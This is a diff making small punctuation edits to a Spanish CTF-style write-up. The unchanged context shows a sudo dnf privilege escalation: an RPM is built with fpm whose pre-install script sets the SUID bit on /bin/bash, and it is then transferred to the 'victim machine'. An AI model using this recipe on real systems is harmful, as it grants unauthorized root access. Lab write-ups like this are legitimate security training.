@@ -111,14 +111,14 @@ Matching Defaults entries for primpi on c35c7f5e90f9:
 User primpi may run the following commands on c35c7f5e90f9:
     (ALL) NOPASSWD: /usr/bin/dnf
 ```
-Vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/) y vemos que podemos ver los pasos para crear un archivo malicioso que después subiremo a la máquina lo ejecutaremos con **/usr/bin/dnf**.
+Vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/dpkg/) y vemos que podemos ver los pasos para crear un archivo malicioso, que después subiremos a la máquina y ejecutaremos con **/usr/bin/dnf**.
 ```bash
 ❯ TF=$(mktemp -d)
 echo 'chmod u+s /bin/bash' > $TF/x.sh
 fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
 Created package {:path=>"x-1.0-1.noarch.rpm"}
 ```
-Hemos creardo el archivo **x-1.0-1.noarch.rpm** que ahora lo subiremos a la máquina victima creando un servidor **http** con python en el directorio donde tenemos nuestro archivo y con **curl** lo descargamos en la máquina victima en la carpeta
+Hemos creardo el archivo **x-1.0-1.noarch.rpm** que ahora lo subiremos a la máquina victima, creando un servidor **http** con python en el directorio donde tenemos nuestro archivo y con **curl** lo descargamos en la máquina victima en la carpeta
 
 
 ```bash
